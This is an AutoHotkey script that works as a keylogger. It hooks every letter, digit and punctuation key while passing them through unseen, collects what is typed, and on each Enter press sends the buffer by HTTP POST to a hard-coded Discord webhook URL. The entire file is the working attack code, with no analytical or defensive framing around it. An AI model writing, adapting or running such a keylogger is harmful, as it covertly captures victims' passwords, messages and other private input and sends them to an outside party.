#Persistent
SetBatchLines, -1
TypedMessage := ""

; --- Letter keys ---
~*a::AddKey("a")
~*b::AddKey("b")
~*c::AddKey("c")
~*d::AddKey("d")
~*e::AddKey("e")
~*f::AddKey("f")
~*g::AddKey("g")
~*h::AddKey("h")
~*i::AddKey("i")
~*j::AddKey("j")
~*k::AddKey("k")
~*l::AddKey("l")
~*m::AddKey("m")
~*n::AddKey("n")
~*o::AddKey("o")
~*p::AddKey("p")
~*q::AddKey("q")
~*r::AddKey("r")
~*s::AddKey("s")
~*t::AddKey("t")
~*u::AddKey("u")
~*v::AddKey("v")
~*w::AddKey("w")
~*x::AddKey("x")
~*y::AddKey("y")
~*z::AddKey("z")

; --- Numbers ---
~*0::AddKey("0")
~*1::CheckSymbol("1", "!")
~*2::CheckSymbol("2", "@")
~*3::CheckSymbol("3", "#")
~*4::CheckSymbol("4", "$")
~*5::CheckSymbol("5", "%")
~*6::CheckSymbol("6", "^")
~*7::CheckSymbol("7", "&")
~*8::CheckSymbol("8", "*")
~*9::CheckSymbol("9", "(")

; --- Punctuation ---
~*Space::AddKey(" ")
~*Backspace::BackspaceKey()
~*Enter::SendMessage()

~*.::AddKey(".")
~*@::AddKey("@")
~*;::AddKey(";")
~*#::AddKey("#")
~*?::AddKey("?")
~*/::AddKey("/")
~*,::AddKey(",")
~*'::AddKey("'")
~*+::AddKey("+")
~*-::AddKey("-")
~*_::AddKey("_")
~*=::
~*`::AddKey("`")
~*^::AddKey("^")
~*&::AddKey("&")
~*)::AddKey(")")
~*<::AddKey("<")
~*>::AddKey(">")
~*{::AddKey("{")
~*}::AddKey("}")
~*|::AddKey("|")
~*~::AddKey("~")





; --- Functions ---
AddKey(char) {
    global TypedMessage
    TypedMessage .= char
}

BackspaceKey() {
    global TypedMessage
    StringTrimRight, TypedMessage, TypedMessage, 1
}

CheckSymbol(num, symbol) {
    if GetKeyState("Shift", "P")
        AddKey(symbol)
    else
        AddKey(num)
}

SendMessage() {
    global TypedMessage
    if (TypedMessage = "")
        return

    url := "https://discord.com/api/webhooks/1392636726362640535/QarK5KdKRVHgG1gEk2abs99rf8A_uf0UIcC4hBH_gvmVh_EtZA7k9p4lw5EAtSJlUb54"
    json := "{""content"":""" . TypedMessage . """}"

    HttpObj := ComObjCreate("WinHttp.WinHttpRequest.5.1")
    HttpObj.Open("POST", url, false)
    HttpObj.SetRequestHeader("Content-Type", "application/json")
    HttpObj.Send(json)

    TypedMessage := ""
}


